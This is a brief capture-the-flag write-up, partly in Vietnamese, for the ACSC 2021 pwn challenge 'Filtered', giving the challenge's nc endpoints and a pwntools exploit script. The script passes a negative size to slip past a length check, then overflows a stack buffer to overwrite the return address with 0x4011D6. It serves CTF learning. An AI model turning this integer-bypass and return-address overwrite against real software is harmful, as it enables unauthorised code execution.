# Filtered
### Thử thách:
- Filter invalid sizes to make it secure!
- Backup: nc 167.99.78.201 9001
nc filtered.chal.acsc.asia 9001
- [Source](https://github.com/antoinenguyen-09/All_CTF_write-ups/tree/master/Asian%20Cyber%20Security%20Challenge%20(ACSC)/2021/pwn/source)
### Kiến thức nền:
- Buffer Overflow.
### Giải quyết vấn đề:

3) Exploit:

```python
from pwn import *
r = remote("167.99.78.201" , 9001)
r.sendline(b"-1")
r.sendline(0x110*b"1" + p64(0xaaaaaaaa)+ p64(0x4011D6))
r.interactive()
```
